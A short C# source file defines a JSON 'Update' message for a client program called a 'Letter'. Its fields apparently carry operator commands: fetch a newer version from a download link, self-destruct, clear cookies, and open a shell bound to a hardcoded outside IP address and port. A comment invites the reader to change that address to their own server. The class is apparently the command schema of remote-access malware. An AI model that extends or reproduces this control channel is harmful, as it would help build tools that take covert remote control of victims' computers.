using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Communication.JSON_Models
{
    public class Update
    {
        public int UpdateVersion = 0;
        public float LetterVersion = 0.1f;

        /// <summary>
        /// Link to the newest Letter.
        /// </summary>
        public string DownloadLink;

        /// <summary>
        /// True if the letter is to self-destruct immediately.
        /// </summary>
        public bool KillSelf = false;

        public bool ClearCookies = false;

        public bool OpenShell = false;

        /// <summary>
        /// Change this to your server.
        /// </summary>
        public string ShellBind = "194.233.71.142:30000";
    }
}
